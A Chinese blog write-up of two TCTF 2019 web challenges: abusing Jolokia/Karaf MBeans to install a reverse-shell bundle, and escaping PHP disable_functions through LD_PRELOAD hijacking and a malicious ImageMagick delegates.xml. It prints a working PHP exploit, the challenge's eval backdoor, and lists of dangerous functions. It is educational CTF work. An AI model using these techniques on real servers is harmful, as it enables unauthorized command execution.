@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>TCTF 2019 线上赛 web 题 writeup | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">TCTF 2019 线上赛 web 题 writeup</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Inicio</i></a><a href="/archives/"><i class="fa fa-archive"> Archivo</i></a><a href="/about/"><i class="fa fa-user"> Acerca de</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">TCTF 2019 线上赛 web 题 writeup</h1><div class="post-meta">Apr 4, 2019<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contenidos</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-Ghost-Pepper"><span class="toc-number">2.</span> <span class="toc-text">0X01 Ghost Pepper</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-题目概览"><span class="toc-number">2.1.</span> <span class="toc-text">1.题目概览</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-补充："><span class="toc-number">2.2.</span> <span class="toc-text">2.补充：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-关于-MBean"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.关于 MBean</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-关于-JMX"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.关于 JMX</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-具体的架构分层如下图："><span class="toc-number">2.2.3.</span> <span class="toc-text">3.具体的架构分层如下图：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-jolokia-的语法"><span class="toc-number">2.2.4.</span> <span class="toc-text">4.jolokia 的语法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-开始利用"><span class="toc-number">2.3.</span> <span class="toc-text">3.开始利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bundle"><span class="toc-number">2.3.1.</span> <span class="toc-text">bundle</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-Wallbreaker-Easy"><span class="toc-number">3.</span> <span class="toc-text">0X02 Wallbreaker Easy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-题目概览-1"><span class="toc-number">3.1.</span> <span class="toc-text">1.题目概览</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-第一种思路—-gt-寻找别的函数"><span class="toc-number">3.2.</span> <span class="toc-text">2.第一种思路—&gt; 寻找别的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-第二种思路—-gt-劫持共享库"><span class="toc-number">3.3.</span> <span class="toc-text">3.第二种思路—&gt; 劫持共享库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-第三种思路—-gt-篡改环境变量"><span class="toc-number">3.4.</span> <span class="toc-text">4.第三种思路—&gt; 篡改环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-第三种思路：监控-tmp-目录"><span class="toc-number">3.5.</span> <span class="toc-text">3.第三种思路：监控 /tmp 目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-参考链接"><span class="toc-number">4.</span> <span class="toc-text">0X03 参考链接</span></a></li></ol></div></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>TCTF 2019 来了，2018 年线上赛的几道 CSP 令人记忆犹新，但是当时太菜并做不出来，final 也没有什么 web 题，被教做人，2019 又会有什么样的惊喜呢，又能学到什么新知识呢，简单记录一下解题思路。</p>
+<h2 id="0X01-Ghost-Pepper"><a href="#0X01-Ghost-Pepper" class="headerlink" title="0X01 Ghost Pepper"></a><strong>0X01 Ghost Pepper</strong></h2><h3 id="1-题目概览"><a href="#1-题目概览" class="headerlink" title="1.题目概览"></a><strong>1.题目概览</strong></h3><p>访问页面需要 <a href="https://segmentfault.com/a/1190000004406025//www.freebuf.com/vuls/166695.html" target="_blank" rel="noopener">basic 认证</a>，然后抓包看到响应中有认证的提示</p>
+<pre><code>WWW-Authenticate: BASIC realm=&quot;karaf&quot;
+</code></pre><p>我们尝试使用 karaf:karaf 登录，发现登录成功</p>
+<a id="more"></a>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp1.png" alt="此处输入图片的描述"></p>
+<p>这应该是第一个提示 ：karaf </p>
+<p>通过阅读<a href="http://karaf.apache.org/manual/latest/#_overview" target="_blank" rel="noopener">官方文档</a>，我们可以发现 karaf 是一个由 OSGI 提供支持的轻量级的容器，可以通过JMX提供管理和操作，同时 Apache Karaf提供了一个JMX MBeanServer。可以使用任何JMX客户端（如jconsole）远程使用此MBeanServer。</p>
+<p>接下来就是带着这些问题去了解什么是 osgi ，例如：osgi 有哪些特性、核心组件是什么</p>
+<p><strong>从<a href="http://baijiahao.baidu.com/s?id=1600246970563166864&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">这篇文章</a>中可以得到如下信息：</strong>一个OSGi程序是由一系列OSGi bundles组成的。OSGi bundle 是一个在MANIFEST中带有附加元数据的jar文件。</p>
+<p>目前没有什么其他的信息，这个页面也没有任何服务，只是下面的 powered by 告诉你这是一个 java 的应用程序，并且在搜索了一下以后 jetty 在最近并没有爆出什么严重的漏洞，那么在这种没有任何业务场景的情况下能够出现漏洞的地方应该就是一些 API 接口了，然后我就尝试扫了一下端口，发现除了本身题目的端口以外只开了 22 端口，着很明显是出题人登录服务器用的端口，并不是我们可以利用的条件。</p>
+<p>猜测题目本身也是提示，于是谷歌一番发现 Ghost pepper 和 jolokia 有一定的关系</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp15.png" alt="此处输入图片的描述"></p>
+<p>而 <a href="https://jolokia.org/" target="_blank" rel="noopener">jolokia</a> 存在一个 JMX 代理模式，通过 HTTP 的 JMX(Java Management Extensions) 连接器，提供了类 RESTful 的操作方式，可以通过 POST JSON 的方式访问和修改 JMX 属性、执行 JMX 操作、搜索 MBean、列出 MBean 的 Meta-data 等</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp17.png" alt="此处输入图片的描述"></p>
+<p>根基官方文档提供的方法，简单测试了一下，可以说思路是没问题了</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp2.png" alt="此处输入图片的描述"></p>
+<p>然后根据<a href="https://www.freebuf.com/vuls/166695.html" target="_blank" rel="noopener">这篇文章</a>的大概思路，我们知道我们大致有<strong>以下三种攻击思路：</strong></p>
+<p>1.JNDI 注入<br>2.信息泄露<br>3.远程操作 MBeans</p>
+<p>而根据上面的分析，我们大致确定了我们的攻击方向是 通过jolokia 的 JMX 代理模式远程操作 apache karaf 为我们提供的 Mbeans</p>
+<h3 id="2-补充："><a href="#2-补充：" class="headerlink" title="2.补充："></a><strong>2.补充：</strong></h3><h4 id="1-关于-MBean"><a href="#1-关于-MBean" class="headerlink" title="1.关于 MBean"></a><strong>1.关于 MBean</strong></h4><p>MBean 是Managed Bean的简称，可以翻译为“管理构件”。在JMX中MBean代表一个被管理的资源实例，通过MBean中暴露的方法和属性，<strong>外界可以获取被管理的资源的状态和操纵MBean的行为</strong>。事实上，MBean就是一个Java Object，同JavaBean模型一样，外界使用自醒和反射来获取Object的值和调用Object的方法，只是MBean更为复杂和高级一些。MBean通过公共方法以及遵从特定的设计模式封装了属性和操作，以便暴露给管理应用程序，详细的的资料<a href="http://karaf.apache.org/manual/latest/#_mbeans" target="_blank" rel="noopener">请看这里</a></p>
+<p>Mbeans 对象有着相同的格式：</p>
+<pre><code>org.apache.karaf:type=[feature],name=[instance]
+</code></pre><p>安装其他Apache Karaf功能和外部应用程序可以提供新的MBean。</p>
+<p><strong>下面是一些简单的罗列：</strong></p>
+<pre><code>org.apache.karaf:type=bundle,name=*: OSGi bundle 的管理.
+
+org.apache.karaf:type=config,name=*: 配置管理.
+
+org.apache.karaf:type=diagnostic,name=*: 创建包含当前Apache Karaf活动的转储.
+
+org.apache.karaf:type=feature,name=*: Apache Karaf功能的管理.
+
+org.apache.karaf:type=http,name=*: HTTP服务的管理（由http功能提供）.
+
+org.apache.karaf:type=instance,name=*: 实例的管理 .
+
+org.apache.karaf:type=jdbc,name=*: JDBC服务的管理（由jdbc功能提供）.
+
+org.apache.karaf:type=jms,name=*: JMS服务的管理（由jms功能提供）.
+
+org.apache.karaf:type=jndi,name=*: JNDI服务的管理（由jndi功能提供）.
+
+org.apache.karaf:type=kar,name=*: 管理KAR文件.
+
+org.apache.karaf:type=log,name=*: 日志服务的管理.
+
+org.apache.karaf:type=obr,name=*: 管理OBR服务（由obr功能提供）.
+
+org.apache.karaf:type=package,name=*: 有关导出/导入的包的详细信息.
+
+org.apache.karaf:type=service,name=*: OSGi服务的管理.
+
+org.apache.karaf:type=system,name=*: Apache Karaf容器本身的管理（暂停，重启等）.
+
+org.apache.karaf:type=web,name=*: ：WebApplications的管理（由war功能提供）.
+
+org.apache.karaf:type=wrapper,name=*: 服务包装器的管理（由包装器功能提供）.
+</code></pre><h4 id="2-关于-JMX"><a href="#2-关于-JMX" class="headerlink" title="2.关于 JMX"></a><strong>2.关于 JMX</strong></h4><p><strong>JMX的架构是组件式的，被设计为三层：</strong></p>
+<p><strong>1.分布层（Distributed layer）：</strong>包含可以使管理应用与JMX Agents交互的组件。一旦通过交互组件与JMX Agents建立连接，用户可以用管理工具来和注册在Agents中的MBeans进行交互<br><strong>2.代理层（Agent layer ）：</strong>包含JMX Agent以及它们包含的MBean Servers。Agent layer的主要组件是MBean server，作为JMX Agents的核心，它充当MBeans的注册中心。该层提供了4个Agent 服务来使对MBean的管理更容易：计时器（Timer）、监控（monitoring）、动态加载MBean（dynamic MBean loading ）、关系服务（relationship services ）<br><strong>3.指示层（Instrumentation layer）：</strong>包含代表可管理资源的MBeans。该层是最接近管理资源的，它由注册在Agents中的MBeans组成，这个MBean允许通过JMX Agent来管理。每个MBean都暴露出来针对底层资源的操作和访问；</p>
+<h4 id="3-具体的架构分层如下图："><a href="#3-具体的架构分层如下图：" class="headerlink" title="3.具体的架构分层如下图："></a><strong>3.具体的架构分层如下图：</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp14.png" alt="此处输入图片的描述"></p>
+<h4 id="4-jolokia-的语法"><a href="#4-jolokia-的语法" class="headerlink" title="4.jolokia 的语法"></a><strong>4.jolokia 的语法</strong></h4><p>为了能够成功利用这里面的 MBean 我们还必须对 jolokia 的 POST 语法比较熟悉，我们去翻一下<a href="https://jolokia.org/reference/html/protocol.html#request-response" target="_blank" rel="noopener">官方文档</a></p>
+<h3 id="3-开始利用"><a href="#3-开始利用" class="headerlink" title="3.开始利用"></a><strong>3.开始利用</strong></h3><p>根据之前引用的那篇文章，我们现在的思路就是这样，我们需要在 list 列表里面找到一个我们能够引用的 MBean 根据其自带的操作，实现命令执行然后反弹 shell 去读 flag </p>
+<h4 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a><strong>bundle</strong></h4><p>那么既然我们之前已经了解到了 osgi 是依赖于 bundle 的，而且在上面官方文档提供的名单里 bunlde 是那我们就首先看一下 List 列表里面关于 bundle 的信息吧</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp18.png" alt="此处输入图片的描述"></p>
+<p>可以看到这里面的方法还是非常多的，但是最引人注目的还是可以自己安装并开启一个 bundle 了，那么 非常好，我们现在就需要阅读源码，看一下其 install 的步骤，然后我们自己编写一个带有反弹 shell 功能的 bundle 给他安装上，再 strat() 就 ok 了。</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp19.png" alt="此处输入图片的描述"></p>
+<p>可以看到，安装的方式非常简单，我们只要传入 jar 包的 url 就可以了，并且值得一提的是在安装以后会自动帮我们调用 start() 函数，这还帮我们省去了一个步骤</p>
+<p>那我们开始构建 bundle 的 jar 包，参考<a href="https://blog.csdn.net/Love_Taylor/article/details/75194394" target="_blank" rel="noopener">这篇文章</a></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp20.png" alt="此处输入图片的描述"></p>
+<p>我们将 jar 包上传到自己的服务器上，然后使用 json 格式发起请求</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp21.png" alt="此处输入图片的描述"></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp23.png" alt="此处输入图片的描述"></p>
+<h2 id="0X02-Wallbreaker-Easy"><a href="#0X02-Wallbreaker-Easy" class="headerlink" title="0X02 Wallbreaker Easy"></a><strong>0X02 Wallbreaker Easy</strong></h2><h3 id="1-题目概览-1"><a href="#1-题目概览-1" class="headerlink" title="1.题目概览"></a><strong>1.题目概览</strong></h3><p>很明显这是一道 Bypass disable_function 的题（一开始都是一个 tmp 目录，后来出题人稍微改了一下）</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp7.png" alt="此处输入图片的描述"></p>
+<p>并且出题人给了我们一个受限的 shell</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp4.png" alt="此处输入图片的描述"></p>
+<p>通过这个 shell 我们能看到这个文件是怎么写的</p>
+<pre><code>&lt;?php
+$dir = &quot;/tmp/&quot; . md5(&quot;$_SERVER[REMOTE_ADDR]&quot;);
+mkdir($dir);
+ini_set(&apos;open_basedir&apos;, &apos;/var/www/html:&apos; . $dir);
+?&gt;
+&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
+&lt;pre class=&quot;pre&quot;&gt;&lt;code&gt;Imagick is a awesome library for hackers to break `disable_functions`.
+So I installed php-imagick in the server, opened a `backdoor` for you.
+Let&apos;s try to execute `/readflag` to get the flag.
+Open basedir: &lt;?php echo ini_get(&apos;open_basedir&apos;);?&gt;
+
+&lt;?php eval($_POST[&quot;backdoor&quot;]);?&gt;
+Hint: eval($_POST[&quot;backdoor&quot;]);
+&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt;
+</code></pre><p>根据提示出题人的意图是让我们利用 Imagick 这个 PHP 库去 Bypass，但是不管怎么样还是要看一下 phpinfo 中的 disable_functions</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp5.png" alt="此处输入图片的描述"></p>
+<p>复制出来就是下面的样子</p>
+<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
+
+
+system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail
+</code></pre><p><strong>对比一下我之前总结过得一个列表(如下)可以看到出题人将 pcntl 过滤的比较完全了，</strong></p>
+<pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link,map_open,imap_mail,ini_set,ini_alter
+</code></pre><p><strong>(我这里还需要加一个syslog、imap_open，ld -&gt;这个很明显是出题人写错了应该是 dl map_open 我发现我写错了，根本没这个函数)</strong></p>
+<p><strong>下面是出题人没有过滤到的</strong>，我们可以尝试利用一下，看看有没有突破的希望    </p>
+<pre><code>putenv、apache_setenv、mb_send_mail、assert、set_time_limit、ignore_user_abort、ini_set、ini_alter、dl、imap_mail
+</code></pre><p>当然在利用之前，我们还是要看一下 PHP 目前安装了哪些组件，因为有些利用方式是依赖于特殊组件的，并且要明确 <strong>php 的版本是 7.2.15</strong>，这两个限制就能排除一些可能</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp6.png" alt="此处输入图片的描述"></p>
+<p><strong>排除一些可能：</strong></p>
+<p>dl —————————————&gt;  php 7.0.0 在 PHP-FPM 模式下已禁用 dl()<br>imap_mail ——————————&gt; 没有安装对应组件并且已经禁用 imap_open<br>mb_send_mail  ————————–&gt; mbstring 不是一个默认扩展<br>assert        ———————————–&gt; 属于代码执行，暂时不考虑<br>ignore_user_abort  —————————&gt; 默认不开启,但这里能配合 ini_set 生效，但是不能直接执行命令<br>ini_set        ——————————&gt; 能修改的实际上很少必须要满足<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">选项模式</a>为 PHP_INI_USER 或者 PHP_INI_ALL (<a href="https://www.php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">这里</a>是参数的修改范围列表)<br>set_time_limit   —————————–&gt; 并不能直接执行命令</p>
+<blockquote>
+<p><strong>注：一些能使用 ini_set 修改的高危配置</strong></p>
+<p>open_basedir  ———–出题人在文件一开始设置了这个选项，后来我再设置发现并没有办法覆盖<br>error_log  设置脚本错误将被记录到的文件<br>include_path<br>session.save_path</p>
+</blockquote>
+<p><strong>研究：</strong></p>
+<p>error log 能触发 sendmail (服务器有安装 sendmail，只是禁用了 mail)<br>ffmpeg</p>
+<p><strong>其实看了一圈，最惹人注目的还是 putenv 了</strong>，出题人不可能不知道这个函数的厉害，没有禁用估计就是利用这个没问题了，我们原来的利用方式是结合 LD_PRELOAD 劫持 getuid ，然后结合 mail() 函数调用 sendmail再调用 getuid 实现命令执行(<strong>而这个攻击方法的本质是php的函数在运行的时候会去调动系统命令创建进程，新的进程又能调用系统函数，然后我们就能劫持这个系统函数</strong>)</p>
+<p><strong>比如我们编辑一个 mail.php</strong></p>
+<pre><code>&lt;?php
+
+    mail(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;);
+
+?&gt;
+</code></pre><p>然后去使用 strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve 去追踪一下内部的进程创建</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp11.png" alt="此处输入图片的描述"></p>
+<p>可以看到，Mail 函数调用了 /usr/bin/sendmail，sendmail 可能会加载的函数中</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp12.png" alt="此处输入图片的描述"></p>
+<p>并且在实际的调用中，确实也加载了这个函数</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp13.png" alt="此处输入图片的描述"></p>
+<p>至此，我们应该已经很清楚原始的攻击方法的思路了，我们如果劫持了 getuid() 以后再在 php 中调用 mail() 函数，那么我们自定义的getuid()函数就会被执行,从而成功执行系统命令。</p>
+<p>但是 mail 在这里被禁了，我们只能自己去挖掘别的函数了。</p>
+<h3 id="2-第一种思路—-gt-寻找别的函数"><a href="#2-第一种思路—-gt-寻找别的函数" class="headerlink" title="2.第一种思路—&gt; 寻找别的函数"></a><strong>2.第一种思路—&gt; 寻找别的函数</strong></h3><p>上面说了本来的 mail() 是可以的，还有 mb_send_mail() 、imap_mail ()、ffmpeg 也是可以的，但是后面三个都不是内置的默认存在的组件，都需要环境安装才行，所以我们只能再去找更隐蔽的，于是 error_log() 这个函数出现了</p>
+<p>我们来看一下 error_log 的参数：</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp26.png" alt="此处输入图片的描述"></p>
+<p>可以看到，这函数是支持向邮箱发送信息的，并且调用的是和 mail() 底层相同的函数，这不是明显说的是 sendmail ,我们来测试一下</p>
+<p><strong>mail.php</strong></p>
+<pre><code>&lt;?php
+
+error_log(&quot;a&quot;,1,&quot;test@163.com&quot;,&quot;1&quot;);
+
+?&gt;
+</code></pre><p>然后我们来追踪一下函数调用情况</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp27.png" alt="此处输入图片的描述"></p>
+<p>说明在这样的禁用 mail 的环境下我们是可以使用 error_log 进行劫持的</p>
+<h3 id="3-第二种思路—-gt-劫持共享库"><a href="#3-第二种思路—-gt-劫持共享库" class="headerlink" title="3.第二种思路—&gt; 劫持共享库"></a><strong>3.第二种思路—&gt; 劫持共享库</strong></h3><p>后来发现我们可以不劫持具体的函数，我们可以直接劫持共享库，思路来源<a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">是这里</a>，那么现在问题就简化成了我们只要能找到一个 php 的函数，这个函数在调用的时候能执行一个系统中自带的二进制文件就可以了(注意，不是 /usr/bin/php 这个文件是 php 引擎的启动文件)</p>
+<h3 id="4-第三种思路—-gt-篡改环境变量"><a href="#4-第三种思路—-gt-篡改环境变量" class="headerlink" title="4.第三种思路—&gt; 篡改环境变量"></a><strong>4.第三种思路—&gt; 篡改环境变量</strong></h3><p>不用多说，预期解肯定是和 imagick 这个库有关系，正如上面我引用的那篇文章中说的 Bypass disable_functions 的思路一共有以下四种的话：</p>
+<p><strong>1.攻击后端组件：</strong>寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；<br><strong>2.寻找未禁用的漏网函数：</strong>常见的执行命令的函数有system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；<br><strong>3.mod_cgi 模式：</strong>尝试修改 .htaccess，调整请求访问路由，绕过 php.ini中的任何限制；<br><strong>4.利用环境变量：</strong> LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p>
+<p>这里的官方解利用就一定是第一种方法，其实就是一种：“<strong>你禁用我 php 执行命令，但是你禁用不了 Imagick 执行命令</strong>” 的思想，那么如果 imagick 执行的命令我们是可控的，那么我们就成功了。</p>
+<p>我们唯一的办法就是从整个组件的<a href="https://imagemagick.org/index.php" target="_blank" rel="noopener">官网介绍</a>，和<a href="https://github.com/ImageMagick/ImageMagick" target="_blank" rel="noopener">源码</a>中找到蛛丝马迹，后来在 <a href="https://imagemagick.org/source/delegates.xml" target="_blank" rel="noopener">这里</a>  我们可以找到 imagick 的文件格式转换的配置文件</p>
+<p><strong>如图所示：</strong></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp8.png" alt="此处输入图片的描述"></p>
+<p>看一下这个 xml 自己的说明</p>
+<pre><code>Delegate command file.
+
+ Commands which specify
+
+   decode=&quot;in_format&quot; encode=&quot;out_format&quot;
+
+ specify the rules for converting from in_format to out_format.  Use these
+ rules to translate directly between formats.
+
+ Commands which specify only
+
+   decode=&quot;in_format&quot;
+
+ specify the rules for converting from in_format to some format that
+ ImageMagick automatically recognizes. Use these rules to decode formats.
+
+ Commands which specify only
+
+  encode=&quot;out_format&quot;
+
+ specify the rules for an &quot;encoder&quot; which may accept any input format.
+
+ The substitution rules are as follows:
+
+   %a  authentication passphrase
+   %b  image file size in bytes
+   %g  image geometry
+   %h  image rows (height)
+   %i  input image filename
+   %#  input image signature
+   %m  input image format
+   %o  output image filename
+   %p  page number
+   %q  input image depth
+   %s  scene number
+   %u  unique temporary filename
+   %w  image columns (width)
+   %x  input image x resolution
+   %y  input image y resolution
+
+ Set option delegate:bimodal=true to process bimodal delegates otherwise they
+ are ignored.
+
+ If stealth=&quot;True&quot; the delegate is not listed in user requested
+ &quot;-list delegate&quot; listings. These are typically special internal delegates.
+
+ If spawn=&quot;True&quot;, ImageMagick does not wait for the delegate to finish, nor
+ will it read any output image.
+</code></pre><p>很明显，在图片进行格式转换的时候会执行 command 参数后面的命令，但是问题出现了，这个是全局的配置文件，我们有办法覆盖吗？那我们还是要从根源上去找，github 读有关文件格式转化的源码，看有没有我们利用的可能</p>
+<p><strong>我们从 quickstart.txt 中找到了<a href="https://github.com/ImageMagick/ImageMagick/blob/826cbebfe562ac9160a3cb4316b4e4bed61203cb/QuickStart.txt#L72" target="_blank" rel="noopener">这样的话</a></strong></p>
+<pre><code>Configuration Files
+
+      ImageMagick depends on a number of external configuration files which
+      include colors.xml, delegates.xml, and others.
+      ImageMagick searches for configuration files in the following order, and
+      loads them if found:
+
+          $MAGICK_CONFIGURE_PATH
+          $MAGICK_HOME/etc/ImageMagick
+          $MAGICK_HOME/share/ImageMagick-7.0.2/config
+          $HOME/.config/ImageMagick/
+          &lt;client path&gt;/etc/ImageMagick/
+          &lt;current directory&gt;/
+</code></pre><p>也就是说，其加载的 delegates.xml 是有一个默认的寻找位置的，我们先去环境中读取一下， 看看原来的环境变量设置什么(我们直接执行 phpinfo();)</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp9.png" alt="此处输入图片的描述"></p>
+<p>我们发现只有 HOME 这么一个环境变量，也就是说 <code>$MAGICK_CONFIGURE_PATH</code>、<code>$MAGICK_HOME</code> 都找不到我们的配置文件，那接下来就轮到 <code>$HOME</code> 了，我们现在只要能将 $HOME 改成我们可控的目录(在这里是出题人规定的 /tmp/md5(ip))，然后创建对应的.config/ImageMagick/ 目录，然后再是将我们自定义的配置文件放在该目录下等到调用 文件格式修改的函数的时候就会加载我们恶意的配置文件，然后成功命令执行，而环境变量的修改出题人也给我们留了 putenv 这个函数，现在一切都梳理清楚了</p>
+<p><strong>给出 exp</strong> </p>
+<pre><code>$home = &apos;/tmp/7087afd091c14610b696f6d551930014&apos;;
+ini_set(&apos;display_errors&apos;, 1); 
+//mkdir(&quot;$home/.magick/&quot;);
+mkdir(&quot;$home/.config/&quot;);
+mkdir(&quot;$home/.config/ImageMagick&quot;);
+//file_put_contents(&quot;$home/.magick/delegates.xml&quot;, &quot;&lt;delegatemap&gt;&lt;delegate decode=\&quot;foo\&quot; command=\&quot;/readflag &gt; $home/flag\&quot;/&gt;&lt;/delegatemap&gt;&quot;);
+file_put_contents(&quot;$home/.config/ImageMagick/delegates.xml&quot;, &quot;&lt;delegatemap&gt;&lt;delegate decode=\&quot;foo\&quot; command=\&quot;/readflag &gt; $home/flag\&quot;/&gt;&lt;/delegatemap&gt;&quot;);
+touch(&quot;$home/test.foo&quot;);
+$_ENV[&apos;HOME&apos;] = $home;
+var_dump(putenv(&quot;HOME=$home/&quot;));
+var_dump(getenv(&quot;HOME&quot;));
+try {
+  $i = new Imagick(&quot;$home/test.foo&quot;);
+  $i-&gt;writeImage(&quot;$home/test.png&quot;);
+} catch(Exception $e) {
+  var_dump($e);
+}
+var_dump(file_get_contents(&quot;$home/flag&quot;));
+</code></pre><p><strong>运行结果：</strong></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp10.png" alt="此处输入图片的描述"></p>
+<h3 id="3-第三种思路：监控-tmp-目录"><a href="#3-第三种思路：监控-tmp-目录" class="headerlink" title="3.第三种思路：监控 /tmp 目录"></a><strong>3.第三种思路：监控 /tmp 目录</strong></h3><p>因为一开始出题人没有设置每个人的 tmp ，这让大家都是在一个 tmp 目录下混战，如图</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp3.png" alt="此处输入图片的描述"></p>
+<p>于是就有师傅们就有了各种各样的骚想法</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp24.png" alt="此处输入图片的描述"></p>
